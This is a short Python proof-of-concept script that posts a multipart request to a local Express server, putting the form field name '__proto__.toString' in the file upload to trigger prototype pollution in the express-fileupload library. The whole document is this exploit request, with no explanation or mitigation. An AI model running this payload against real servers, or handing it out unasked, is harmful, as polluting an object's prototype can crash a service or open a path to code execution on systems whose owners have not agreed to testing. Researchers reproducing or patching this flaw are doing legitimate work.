import requests

res = requests.post("http://127.0.0.1:8080/", files = {'__proto__.toString': 'express-fileupload poc'})
print(res)